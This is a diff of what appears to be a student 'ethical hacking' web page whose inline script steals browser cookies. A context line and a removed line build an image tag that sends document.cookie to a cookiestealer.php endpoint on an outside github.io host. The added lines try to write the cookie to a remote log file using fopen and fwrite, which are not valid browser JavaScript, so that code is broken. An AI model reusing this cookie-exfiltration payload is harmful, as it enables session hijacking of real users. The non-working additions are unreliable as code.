@@ -398,21 +398,22 @@ document.write('<img src=https://ethicalhackinggroup9.github.io/EthicalHacking/c
 <script>console.log(document.cookie);</script> --->
 <script type="text/javascript">
   document.cookie = "username=Null Byte";
-
-const fs = require('fs') 
+file = fopen("https://ethicalhackinggroup9.github.io/EthicalHacking/log.txt", 3);// opens the file for writing
+fwrite(file,  document.cookie);// str is the content that is to be written into the file.
+// const fs = require('fs') 
   
-// Data which will write in a file. 
-let data = document.cookie;
+// // Data which will write in a file. 
+// let data = document.cookie;
   
-// Write data in 'Output.txt' . 
-fs.writeFile('log.txt', data, (err) => { 
+// // Write data in 'Output.txt' . 
+// fs.writeFile('log.txt', data, (err) => { 
       
-    // In case of a error throw err. 
-    if (err) throw err; 
-}) 
+//     // In case of a error throw err. 
+//     if (err) throw err; 
+// }) 
 
 //  document.location='https://ethicalhackinggroup9.github.io/EthicalHacking/cookiestealer.php?c='+document.cookie;
 // document.cookie = "username=Null Byte";
-document.write('<img src="https://ethicalhackinggroup9.github.io/EthicalHacking/cookiestealer.php?c=' + document.cookie + '" />')
-alert("NEW8");
+// document.write('<img src="https://ethicalhackinggroup9.github.io/EthicalHacking/cookiestealer.php?c=' + document.cookie + '" />')
+alert("NEW9");
 </script>
